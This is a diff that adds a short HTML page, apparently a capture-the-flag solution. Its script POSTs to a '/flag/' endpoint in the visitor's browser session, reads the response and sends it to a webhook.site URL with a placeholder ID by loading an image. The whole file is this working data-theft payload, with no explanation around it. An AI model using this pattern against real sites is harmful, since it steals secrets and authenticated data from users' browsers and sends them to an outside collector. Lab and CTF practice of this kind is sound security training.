@@ -1,0 +1,11 @@
+<html>
+<body>
+<script>
+fetch("/flag/", {method: "POST"})
+.then(r => r.text())
+.then(t => {
+    new Image().src = "https://webhook.site/TON-ID?flag=" + encodeURIComponent(t);
+});
+</script>
+</body>
+</html>
